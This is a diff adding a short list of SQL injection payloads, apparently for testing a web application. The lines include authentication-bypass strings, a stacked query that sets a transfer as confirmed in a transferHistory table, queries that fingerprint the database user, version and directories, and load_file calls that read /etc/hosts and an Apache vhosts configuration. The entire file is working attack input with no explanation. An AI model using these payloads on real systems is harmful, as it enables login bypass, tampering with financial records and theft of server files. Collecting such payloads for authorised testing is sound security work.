@@ -1,0 +1,10 @@
+' or '1'='1
+' or '1'='1'; SELECT * from users WHERE login = '' OR '1=1
+' or '1'='1'; UPDATE transferHistory SET confirm = 1 WHERE receiver='Jan Kowalski
+'; SELECT @@datadir;
+'; SELECT user() '
+'; SELECT version() '
+'; SELECT database() '
+'; SELECT 1, load_file('/etc/hosts') '
+'; SELECT 1, load_file('/opt/lampp/etc/extra/httpd-vhosts.conf') '
+'; SHOW VARIABLES WHERE Variable_Name LIKE "%dir" '
